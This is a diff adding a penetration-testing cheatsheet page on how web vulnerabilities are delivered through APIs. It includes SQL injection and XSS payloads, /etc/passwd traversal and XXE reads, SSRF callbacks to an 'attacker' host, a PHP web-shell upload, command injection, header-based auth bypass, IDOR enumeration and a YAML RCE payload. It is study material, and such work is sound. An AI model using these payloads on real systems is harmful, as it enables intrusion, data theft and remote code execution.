@@ -1,0 +1,435 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
+<title>API Vuln Context · ArxOS cheatsheets</title><link rel="stylesheet" href="../../../../codex.css"></head>
+<body><header class="cx-top"><a class="cx-brand" href="../../../../index.html">ArxOS</a><span class="cx-sub">Cheatsheets</span>
+<a class="cx-search-link" href="../../../../index.html#search">Search</a></header>
+<main class="cx-main"><nav class="cx-crumbs"><a href="../../../../index.html">Cheatsheets</a> › Web › Web Services &amp; APIs</nav><h1>API Vuln Context</h1><p class="cx-lede">How each canonical web-app vulnerability class manifests when delivered through an API surface - body-vs-URL parameter delivery, JSON-shaped payloads, base64-encoded values, content-negotiation pivots, and the API-specific quirks for SQL injection, XSS, LFI, SSRF, XXE, IDOR, file upload, and command injection. A bridge from this cluster to the canonical vuln-class clusters with the API delivery deltas captured here.</p><div class="cx-tags"><span class="cx-tag">MITRE T1190, T1213</span><span class="cx-tag">D3FEND D3-IAA</span><span class="cx-tag">IMPACT DataExfil, RCE, AuthBypass</span><span class="cx-tag">OWASP A03, A05, A08</span></div><article class="cx-body"><h2 id="tldr">TL;DR</h2>
+<p>Every classical web vulnerability can appear through an API surface - the substance is the same, the delivery channel and encoding are different. This page captures the API-specific deltas; the canonical attack mechanics live in their dedicated clusters.</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code># Same vuln class, different delivery
+SQLi      via SOAP &lt;username&gt;&#x27;; UNION SELECT * FROM users--&lt;/username&gt;
+XSS       via REST /api/echo/&lt;script&gt;... after URL-encoding bypasses naive filters
+LFI       via API ?filename=../../../etc/passwd (URL-encoded slashes)
+SSRF      via API ?id=&lt;base64&gt;http://attacker:4444&lt;/base64&gt;
+XXE       via JSON→XML content-type pivot, or any XML-body API
+IDOR      via REST /api/users/&lt;id&gt; (textbook, see IDOR cluster)
+Upload    via POST /api/upload/ with .php Content-Type: application/x-php
+Cmd inj   via API parameter reaching system()/shell_exec()</code></pre></figure>
+<p>Success indicator depends on the underlying vuln class - see the linked cluster for each.</p>
+<h2 id="why-apis-change-the-picture">Why APIs change the picture</h2>
+<p>The classical web-app vulnerability literature assumes a browser-driven HTML form submitting URL-encoded data. APIs change three things about that picture:</p>
+<table>
+<thead>
+<tr>
+<th>Dimension</th>
+<th>Classical web app</th>
+<th>API</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Body format</strong></td>
+<td><code>application/x-www-form-urlencoded</code></td>
+<td>JSON, XML, multipart, binary</td>
+</tr>
+<tr>
+<td><strong>Discovery</strong></td>
+<td>Crawl HTML, find forms</td>
+<td>WSDL, OpenAPI, GraphQL introspection, JS bundle reading</td>
+</tr>
+<tr>
+<td><strong>Parameter location</strong></td>
+<td>URL query or form body</td>
+<td>Any of: URL path segment, URL query, JSON body field, XML element, HTTP header, custom binary frame</td>
+</tr>
+<tr>
+<td><strong>Encoding</strong></td>
+<td>URL-encoded</td>
+<td>Whatever the format dictates - often double-encoded or base64'd</td>
+</tr>
+<tr>
+<td><strong>Reflection</strong></td>
+<td>Page-rendered HTML</td>
+<td>Usually JSON response (no HTML reflection - XSS rarer but not zero)</td>
+</tr>
+</tbody>
+</table>
+<p>The vulnerability mechanics don't change. The delivery has to adapt to the format. This page covers the adaptation.</p>
+<h2 id="sql-injection">SQL Injection</h2>
+<p>The substance: untrusted input concatenated into a SQL query. The API delta: input arrives via a SOAP parameter, JSON field, GraphQL argument, or REST path/query - not a form field.</p>
+<h3 id="through-soap">Through SOAP</h3>
+<p>The classic. The SOAP envelope's parameter elements behave exactly like form fields:</p>
+<figure class="cx-code"><figcaption>xml</figcaption><pre><code class="language-xml">&lt;soap:Body&gt;
+  &lt;LoginRequest xmlns=&quot;http://tempuri.org/&quot;&gt;
+    &lt;username&gt;&#x27; UNION SELECT username, password FROM users-- -&lt;/username&gt;
+    &lt;password&gt;anything&lt;/password&gt;
+  &lt;/LoginRequest&gt;
+&lt;/soap:Body&gt;</code></pre></figure>
+<p>Same payload class as form-based injection. SQLMap supports SOAP:</p>
+<figure class="cx-code"><figcaption>shell</figcaption><pre><code class="language-shell">$ sqlmap -u http://target:3002/wsdl \
+         --data=&#x27;&lt;soap:Envelope&gt;...&lt;username&gt;*&lt;/username&gt;...&lt;/soap:Envelope&gt;&#x27; \
+         --dbms sqlite --level 5 --risk 3</code></pre></figure>
+<p>The <code>*</code> marks the injection point. SQLMap recognizes SOAP body structure and tests each marked parameter.</p>
+<h3 id="through-json-body">Through JSON body</h3>
+<figure class="cx-code"><figcaption>http</figcaption><pre><code class="language-http">POST /api/search HTTP/1.1
+Content-Type: application/json
+
+{&quot;query&quot;: &quot;test&#x27; OR &#x27;1&#x27;=&#x27;1&quot;, &quot;limit&quot;: 10}</code></pre></figure>
+<p>SQLMap handles JSON:</p>
+<figure class="cx-code"><figcaption>shell</figcaption><pre><code class="language-shell">$ sqlmap -u http://target/api/search \
+         --data=&#x27;{&quot;query&quot;:&quot;*&quot;, &quot;limit&quot;:10}&#x27; \
+         --headers=&#x27;Content-Type: application/json&#x27;</code></pre></figure>
+<h3 id="through-rest-url-path-segment">Through REST URL path segment</h3>
+<figure class="cx-code"><figcaption></figcaption><pre><code>http://target/api/users/1&#x27; UNION SELECT password FROM users-- -</code></pre></figure>
+<p>Trickier because URL-special characters need encoding:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>http://target/api/users/1%27%20UNION%20SELECT%20password%20FROM%20users-- -</code></pre></figure>
+<p>The shell context for crafting these is essentially:</p>
+<figure class="cx-code"><figcaption>shell</figcaption><pre><code class="language-shell">$ urlencode &quot;1&#x27; UNION SELECT password FROM users-- -&quot;
+1%27%20UNION%20SELECT%20password%20FROM%20users--%20-</code></pre></figure>
+<p>See the <a href="../../sqli/index.html">SQLi cluster</a> for the mechanics. See <a href="../../sqli/sqlmap/index.html#pointing-sqlmap-at-a-target">SQLMap request setup</a> for non-standard request shapes (JSON body, SOAP envelope, custom headers).</p>
+<h2 id="xss">XSS</h2>
+<p>The substance: untrusted input rendered as HTML in a context that executes JavaScript. The API delta: API responses are usually JSON - no HTML rendering - but there are exceptions.</p>
+<h3 id="when-api-responses-do-render-html">When API responses do render HTML</h3>
+<p>Some APIs return HTML error pages, status pages, or auto-generated documentation that reflects request parameters:</p>
+<figure class="cx-code"><figcaption>http</figcaption><pre><code class="language-http">GET /api/download/&lt;script&gt;alert(1)&lt;/script&gt; HTTP/1.1</code></pre></figure>
+<figure class="cx-code"><figcaption>html</figcaption><pre><code class="language-html">&lt;p&gt;Sorry, file &quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot; not found&lt;/p&gt;</code></pre></figure>
+<p>The naive payload often gets escaped. Try URL-encoded variants:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>http://target/api/download/%3Cscript%3Ealert(1)%3C%2Fscript%3E</code></pre></figure>
+<p>Some servers decode once during routing, fail to escape on output → URL-encoded form bypasses naive HTML-encoding filters. See <a href="../../sessions/xss-to-session/index.html">XSS to session</a>.</p>
+<h3 id="when-the-api-renders-error-pages-with-reflection">When the API renders error pages with reflection</h3>
+<p>The "value not found" / "invalid parameter" error pattern reflects input:</p>
+<figure class="cx-code"><figcaption>http</figcaption><pre><code class="language-http">GET /api/lookup?id=&lt;svg onload=alert(1)&gt;</code></pre></figure>
+<figure class="cx-code"><figcaption>html</figcaption><pre><code class="language-html">&lt;error&gt;ID &#x27;&lt;svg onload=alert(1)&gt;&#x27; is not valid&lt;/error&gt;</code></pre></figure>
+<p>If the error response is <code>Content-Type: text/html</code>, the payload fires in any browser that fetches it (XS-Search / XS-Leaks style attacks). If the response is <code>Content-Type: application/json</code>, the payload doesn't fire automatically - but a victim's browser-side code that JSON.parses and renders the error message may execute it.</p>
+<h3 id="xss-via-api-into-the-rendering-frontend">XSS via API into the rendering frontend</h3>
+<p>The harder-to-spot variant: the API stores attacker-controlled data, the frontend SPA later fetches it and renders. The XSS fires when the <em>frontend</em> renders the API response, even though the API itself is "just JSON":</p>
+<figure class="cx-code"><figcaption>http</figcaption><pre><code class="language-http">POST /api/profile HTTP/1.1
+{&quot;display_name&quot;: &quot;&lt;img src=x onerror=alert(1)&gt;&quot;}
+
+# Later, when admin views the user list, the frontend does:
+# document.getElementById(&#x27;name&#x27;).innerHTML = data.display_name  ← XSS here</code></pre></figure>
+<p>This is the canonical "stored XSS through an API" pattern. The vulnerability sits at the frontend-renders-API-data join, not in either component alone.</p>
+<h2 id="local-file-inclusion">Local File Inclusion</h2>
+<p>The substance: untrusted input reaches a file-open operation on the server. The API delta: usually a <code>filename</code>/<code>file</code>/<code>download</code> parameter in the URL or body.</p>
+<h3 id="through-api-url-parameter">Through API URL parameter</h3>
+<figure class="cx-code"><figcaption>http</figcaption><pre><code class="language-http">GET /api/download/..%2f..%2f..%2fetc%2fpasswd HTTP/1.1</code></pre></figure>
+<p>Or:</p>
+<figure class="cx-code"><figcaption>http</figcaption><pre><code class="language-http">GET /api/download?file=../../../etc/passwd HTTP/1.1</code></pre></figure>
+<p>Same primitive as classical LFI. The URL-encoded slashes (<code>%2f</code>) often pass through API routing that would reject literal <code>../</code> due to path normalization.</p>
+<figure class="cx-code"><figcaption>shell</figcaption><pre><code class="language-shell">$ curl &#x27;http://target/api/download/..%2f..%2f..%2fetc%2fpasswd&#x27;
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+...</code></pre></figure>
+<p>See <a href="../../lfi/index.html">LFI cluster</a> for the payload catalog (PHP wrappers, log poisoning, etc.).</p>
+<h3 id="through-json-body_1">Through JSON body</h3>
+<figure class="cx-code"><figcaption>http</figcaption><pre><code class="language-http">POST /api/get-file HTTP/1.1
+Content-Type: application/json
+
+{&quot;path&quot;: &quot;/etc/passwd&quot;}</code></pre></figure>
+<p>Often less defended than URL parameters because input validation typically focuses on URL-level filtering.</p>
+<h2 id="server-side-request-forgery">Server-Side Request Forgery</h2>
+<p>The substance: the server fetches a URL the attacker chooses. The API delta: API parameters frequently accept URLs by design (webhook callbacks, avatar URL fetchers, link previews) and the encoding may be non-obvious.</p>
+<h3 id="direct-url-parameter">Direct URL parameter</h3>
+<figure class="cx-code"><figcaption>http</figcaption><pre><code class="language-http">GET /api/userinfo?id=http://attacker:4444/ HTTP/1.1</code></pre></figure>
+<p>Often rejected with "id parameter is invalid" - the API expects a structured ID, not a URL. The encoding trick:</p>
+<figure class="cx-code"><figcaption>shell</figcaption><pre><code class="language-shell">$ echo &quot;http://attacker:4444/&quot; | base64
+aHR0cDovL2F0dGFja2VyOjQ0NDQv
+
+$ curl &#x27;http://target/api/userinfo?id=aHR0cDovL2F0dGFja2VyOjQ0NDQv&#x27;</code></pre></figure>
+<p>The API may decode <code>id</code> as base64 internally, treat the decoded value as a URL, fetch it. Listener receives the callback.</p>
+<h3 id="different-encodings-to-try">Different encodings to try</h3>
+<p>When the obvious URL pattern is rejected:</p>
+<table>
+<thead>
+<tr>
+<th>Encoding</th>
+<th>Example</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Plain</td>
+<td><code>http://attacker:4444/</code></td>
+</tr>
+<tr>
+<td>URL-encoded</td>
+<td><code>http%3A%2F%2Fattacker%3A4444%2F</code></td>
+</tr>
+<tr>
+<td>Double URL-encoded</td>
+<td><code>http%253A%252F%252Fattacker%253A4444%252F</code></td>
+</tr>
+<tr>
+<td>Base64</td>
+<td><code>aHR0cDovL2F0dGFja2VyOjQ0NDQv</code></td>
+</tr>
+<tr>
+<td>Hex</td>
+<td><code>687474703a2f2f61747461636b65723a343434342f</code></td>
+</tr>
+<tr>
+<td>JSON-string-escaped</td>
+<td><code>"http:\/\/attacker:4444\/"</code></td>
+</tr>
+<tr>
+<td>Object reference</td>
+<td><code>{"url": "http://attacker:4444/"}</code> instead of bare string</td>
+</tr>
+</tbody>
+</table>
+<p>For each encoding, watch your listener for callbacks. The encoding that succeeds tells you something about the API's internal flow - often base64 means "this parameter is normally a token but the back-end blindly trusts decoded content as a URL."</p>
+<p>See <a href="../../server-side/ssrf/index.html">SSRF cluster</a> for the full attack catalog (internal scanning, cloud metadata, etc.).</p>
+<h2 id="xxe-injection">XXE Injection</h2>
+<p>The substance: an XML parser resolves external entities the attacker declares. The API delta: any XML-receiving API is a target, plus the Content-Type pivot for JSON APIs.</p>
+<h3 id="direct-on-xml-api">Direct on XML API</h3>
+<figure class="cx-code"><figcaption>http</figcaption><pre><code class="language-http">POST /api/login/ HTTP/1.1
+Content-Type: text/plain;charset=UTF-8
+
+&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;!DOCTYPE pwn [&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;
+&lt;root&gt;
+  &lt;email&gt;&amp;xxe;&lt;/email&gt;
+  &lt;password&gt;any&lt;/password&gt;
+&lt;/root&gt;</code></pre></figure>
+<p>The API parses the XML body, resolves the entity, includes <code>/etc/passwd</code> content in the request processing. See <a href="../../xxe/index.html">XXE cluster</a>.</p>
+<h3 id="json-xml-content-type-pivot">JSON → XML content-type pivot</h3>
+<p>A JSON API may also accept XML on <code>Content-Type: application/xml</code>:</p>
+<figure class="cx-code"><figcaption>http</figcaption><pre><code class="language-http">POST /api/users HTTP/1.1
+Content-Type: application/xml
+
+&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;!DOCTYPE pwn [&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;
+&lt;user&gt;&lt;name&gt;&amp;xxe;&lt;/name&gt;&lt;/user&gt;</code></pre></figure>
+<p>The JSON-converter library on the back-end (Jackson, Symfony Serializer, ASP.NET ModelBinder) may transparently dispatch to an XML parser when Content-Type is XML. The XXE fires before any JSON-specific validation runs.</p>
+<p>See <a href="../../xxe/identifying/index.html">XXE Identifying</a> for the full Content-Type pivot discussion.</p>
+<h2 id="insecure-direct-object-reference">Insecure Direct Object Reference</h2>
+<p>The substance: the server trusts a client-supplied identifier without checking authorization. The API delta: REST URLs make IDOR more visible (<code>/api/users/74</code>) and more common (every CRUD endpoint is an IDOR candidate by default).</p>
+<p>REST APIs are <em>the</em> canonical IDOR surface. Every <code>/api/&lt;resource&gt;/&lt;id&gt;</code> route deserves substitution testing:</p>
+<figure class="cx-code"><figcaption>shell</figcaption><pre><code class="language-shell">$ curl -b &#x27;session=mine&#x27; http://target/api/users/74     # baseline (own)
+$ curl -b &#x27;session=mine&#x27; http://target/api/users/75     # foreign
+$ for i in $(seq 1 1000); do
+    curl -b &#x27;session=mine&#x27; &quot;http://target/api/users/$i&quot;
+  done &gt; all-users.json</code></pre></figure>
+<p>See <a href="../../idor/identifying/index.html">IDOR Identifying</a> and <a href="../../idor/mass-enumeration/index.html">IDOR Mass enumeration</a> for the full catalog.</p>
+<h2 id="arbitrary-file-upload">Arbitrary File Upload</h2>
+<p>The substance: the server accepts an attacker-controlled file without validating its type/content correctly. The API delta: API uploads bypass HTML form constraints (no <code>accept=</code> attribute, no JavaScript-side validation), so the Content-Type sent is whatever the attacker chooses.</p>
+<figure class="cx-code"><figcaption>http</figcaption><pre><code class="language-http">POST /api/upload/ HTTP/1.1
+Content-Type: multipart/form-data; boundary=---xxx
+
+-----xxx
+Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;backdoor.php&quot;
+Content-Type: application/x-php
+
+&lt;?php system($_REQUEST[&#x27;cmd&#x27;]); ?&gt;
+-----xxx--</code></pre></figure>
+<p>The <code>Content-Type: application/x-php</code> is set by the attacker - no browser would default to that. Servers that trust client-supplied Content-Type fail open immediately. The response usually returns the saved file's URL:</p>
+<figure class="cx-code"><figcaption>json</figcaption><pre><code class="language-json">{&quot;success&quot;: true, &quot;url&quot;: &quot;http://target/uploads/backdoor.php&quot;}</code></pre></figure>
+<p>Then:</p>
+<figure class="cx-code"><figcaption>shell</figcaption><pre><code class="language-shell">$ curl &#x27;http://target/uploads/backdoor.php?cmd=id&#x27;
+uid=33(www-data) gid=33(www-data) groups=33(www-data)</code></pre></figure>
+<p>See <a href="../../uploads/index.html">Uploads cluster</a> for the complete bypass catalog.</p>
+<h2 id="command-injection">Command Injection</h2>
+<p>The substance: untrusted input flows into a shell command. The API delta: API parameters often reach <code>system()</code>/<code>shell_exec()</code>/<code>exec()</code> calls in router-style code that uses <code>call_user_func_array</code> or equivalent dynamic dispatch.</p>
+<p>The typical pattern:</p>
+<figure class="cx-code"><figcaption>php</figcaption><pre><code class="language-php">&lt;?php
+// Vulnerable router
+if ($_SERVER[&#x27;REQUEST_METHOD&#x27;] === &#x27;GET&#x27;) {
+    $parts = explode(&#x27;/&#x27;, $_SERVER[&#x27;PATH_INFO&#x27;]);
+    call_user_func_array($parts[1], array_slice($parts, 2));
+}
+?&gt;</code></pre></figure>
+<p>Intended use: <code>GET /api/ping/8.8.8.8/3</code> calls <code>ping('8.8.8.8', '3')</code>.</p>
+<p>Abuse: <code>GET /api/system/ls</code> calls <code>system('ls')</code>. The first path segment is treated as the function name; subsequent segments are arguments.</p>
+<figure class="cx-code"><figcaption>shell</figcaption><pre><code class="language-shell">$ curl http://target/api/system/id
+uid=0(root) gid=0(root) groups=0(root)
+
+$ curl &#x27;http://target/api/system/cat%20%2Fetc%2Fpasswd&#x27;
+root:x:0:0:root:/root:/bin/bash
+...</code></pre></figure>
+<p>The vulnerability is the dynamic-dispatch router (call_user_func_array with attacker-controlled function name), not the <code>ping</code> function's input validation. The route never reaches the <code>ping</code> function. See <a href="../../command-injection/index.html">Command injection cluster</a>.</p>
+<h2 id="authentication-weaknesses">Authentication weaknesses</h2>
+<p>API authentication tends to use bearer tokens, API keys, or HMAC signatures rather than session cookies. Each has its own attack patterns:</p>
+<table>
+<thead>
+<tr>
+<th>Mechanism</th>
+<th>API-specific weaknesses</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Bearer tokens</strong></td>
+<td>Leaked tokens in logs / Referer headers / GitHub commits; token without expiry; JWT signing weaknesses</td>
+</tr>
+<tr>
+<td><strong>API keys</strong></td>
+<td>Hardcoded in mobile apps / JS bundles; checked-in to public repos; not bound to IP / origin</td>
+</tr>
+<tr>
+<td><strong>HMAC signatures</strong></td>
+<td>Replay attacks when nonce isn't enforced; signature-bypass tricks (sending without signature on endpoints that don't validate); weak hash algorithms (HMAC-MD5)</td>
+</tr>
+<tr>
+<td><strong>OAuth flows</strong></td>
+<td>redirect_uri validation gaps; PKCE bypass; client_secret in frontend code</td>
+</tr>
+<tr>
+<td><strong>mTLS</strong></td>
+<td>Server doesn't validate client cert subject; cert pinning bypass in mobile</td>
+</tr>
+</tbody>
+</table>
+<p>For JWT specifically, see <a href="../../auth/jwt/index.html">JWT attacks</a>. For session-style attacks adapted to API context, see <a href="../../sessions/index.html">Sessions cluster</a>.</p>
+<h2 id="rate-limiting-authentication-header-tricks">Rate limiting / authentication header tricks</h2>
+<p>Many APIs apply rate limiting by IP or by API key. Bypass paths:</p>
+<h3 id="proxy-headers">Proxy headers</h3>
+<p>When the API server respects <code>X-Forwarded-For</code> or similar for rate-limit / authentication:</p>
+<figure class="cx-code"><figcaption>http</figcaption><pre><code class="language-http">GET /api/admin HTTP/1.1
+X-Forwarded-For: 127.0.0.1
+X-Real-IP: 127.0.0.1
+X-Originating-IP: 127.0.0.1
+Client-IP: 127.0.0.1
+True-Client-IP: 127.0.0.1
+Forwarded: for=127.0.0.1</code></pre></figure>
+<p>Internal-only endpoints sometimes whitelist <code>127.0.0.1</code> and any of these headers, set by an attacker, satisfies the whitelist.</p>
+<figure class="cx-code"><figcaption>php</figcaption><pre><code class="language-php">&lt;?php
+// Vulnerable whitelist check
+$whitelist = array(&quot;127.0.0.1&quot;, &quot;1.3.3.7&quot;);
+if (!in_array($_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;], $whitelist)) {
+    header(&quot;HTTP/1.1 401 Unauthorized&quot;);
+    exit;
+}
+print(&quot;Hello Developer team! ...&quot;);
+?&gt;</code></pre></figure>
+<p><code>X-Forwarded-For: 127.0.0.1</code> bypasses the check completely.</p>
+<h3 id="token-rotation-ip-rotation">Token rotation / IP rotation</h3>
+<p>For rate-limited endpoints where one token has a per-hour budget:</p>
+<figure class="cx-code"><figcaption>shell</figcaption><pre><code class="language-shell"># Rotate through multiple test accounts
+for token in $TOKEN1 $TOKEN2 $TOKEN3; do
+    curl -H &quot;Authorization: Bearer $token&quot; http://target/api/...
+done</code></pre></figure>
+<p>Or rotate IPs via proxy chains (Tor, residential proxies, etc.) - beyond the scope of this page.</p>
+<h2 id="format-confusion-attacks">Format-confusion attacks</h2>
+<p>A relatively novel API-specific attack class: the API accepts multiple formats (JSON, XML, MessagePack, YAML) and parsing differs.</p>
+<figure class="cx-code"><figcaption>http</figcaption><pre><code class="language-http">POST /api/login HTTP/1.1
+Content-Type: application/yaml
+
+username: admin
+password: !!python/object/apply:os.system [&quot;id&quot;]</code></pre></figure>
+<p>If the back-end uses Python's <code>yaml.load()</code> (deprecated) instead of <code>yaml.safe_load()</code>, the <code>!!python/object/apply:</code> directive executes <code>os.system("id")</code> at parse time - RCE before any application logic runs.</p>
+<p>The same pattern with different formats:</p>
+<table>
+<thead>
+<tr>
+<th>Format</th>
+<th>Vulnerable parser</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>YAML</td>
+<td>Python <code>yaml.load</code>, Ruby <code>YAML.load</code> (older)</td>
+</tr>
+<tr>
+<td>Pickle</td>
+<td>Python <code>pickle.loads()</code> on untrusted data - always RCE</td>
+</tr>
+<tr>
+<td>Java serialized</td>
+<td><code>ObjectInputStream.readObject()</code> on untrusted bytes - classic ysoserial chain</td>
+</tr>
+<tr>
+<td>.NET BinaryFormatter</td>
+<td>Equivalent .NET vuln</td>
+</tr>
+<tr>
+<td>PHP serialize</td>
+<td><code>unserialize()</code> with magic methods (<code>__wakeup</code>, <code>__destruct</code>)</td>
+</tr>
+<tr>
+<td>MessagePack</td>
+<td>Generally safe but custom ext-types sometimes deserializable</td>
+</tr>
+</tbody>
+</table>
+<p>When you find an API that accepts multiple formats via Content-Type, try each - the lesser-traveled format is often the one with the deserialization bug.</p>
+<p>This bridges into deserialization attacks, which are large enough for their own cluster (a candidate for a future round).</p>
+<h2 id="quick-reference">Quick reference</h2>
+<table>
+<thead>
+<tr>
+<th>Vuln class</th>
+<th>API delivery pattern</th>
+<th>Canonical cluster</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>SQL injection</td>
+<td>Body element, JSON field, URL path segment</td>
+<td><a href="../../sqli/index.html">SQLi</a></td>
+</tr>
+<tr>
+<td>XSS</td>
+<td>API error reflection, stored-then-rendered, URL-encoded payload</td>
+<td><a href="../../sessions/xss-to-session/index.html">XSS to session</a></td>
+</tr>
+<tr>
+<td>LFI</td>
+<td>URL-encoded <code>../</code>, <code>filename=</code> JSON field</td>
+<td><a href="../../lfi/index.html">LFI</a></td>
+</tr>
+<tr>
+<td>SSRF</td>
+<td>URL parameter, base64-encoded URL, JSON-shaped URL</td>
+<td><a href="../../server-side/ssrf/index.html">SSRF</a></td>
+</tr>
+<tr>
+<td>XXE</td>
+<td>XML-body API, JSON→XML Content-Type pivot</td>
+<td><a href="../../xxe/index.html">XXE</a></td>
+</tr>
+<tr>
+<td>IDOR</td>
+<td>REST <code>/api/&lt;resource&gt;/&lt;id&gt;</code> substitution</td>
+<td><a href="../../idor/index.html">IDOR</a></td>
+</tr>
+<tr>
+<td>File upload</td>
+<td>POST with attacker-chosen Content-Type</td>
+<td><a href="../../uploads/index.html">Uploads</a></td>
+</tr>
+<tr>
+<td>Command injection</td>
+<td>API parameter into shell, dynamic-dispatch router</td>
+<td><a href="../../command-injection/index.html">Command injection</a></td>
+</tr>
+<tr>
+<td>Auth bypass via headers</td>
+<td><code>X-Forwarded-For: 127.0.0.1</code>, etc.</td>
+<td>(this page above)</td>
+</tr>
+<tr>
+<td>Deserialization</td>
+<td>YAML/Pickle/Java/PHP/messagepack via Content-Type</td>
+<td>future cluster</td>
+</tr>
+<tr>
+<td>ReDoS</td>
+<td>Long crafted strings against vulnerable regex</td>
+<td><a href="../redos/index.html">ReDoS</a></td>
+</tr>
+<tr>
+<td>WordPress XML-RPC abuse</td>
+<td><code>xmlrpc.php</code> brute / pingback / multicall</td>
+<td><a href="../../wordpress/xmlrpc-abuse/index.html">WP XML-RPC</a></td>
+</tr>
+<tr>
+<td>SOAPAction spoofing</td>
+<td>Body operation ≠ header SOAPAction</td>
+<td><a href="../soapaction-spoofing/index.html">SOAPAction spoofing</a></td>
+</tr>
+</tbody>
+</table>
+<p>For the standalone API-specific topic (ReDoS), see <a href="../redos/index.html">ReDoS</a>. For the capstone chain (SOAPAction spoofing + SQL injection), see <a href="../capstone-chain/index.html">Capstone chain</a>.</p></article><nav class="cx-pager"><a class="cx-prev" href="../soapaction-spoofing/index.html">Previous: SOAPAction Spoofing</a><a class="cx-next" href="../redos/index.html">Next: ReDoS</a></nav></main>
+<footer class="cx-foot"><p>For authorized testing and study only. <a href="../../../../license.html">License</a></p></footer>
+<script src="../../../../codex.js"></script></body></html>
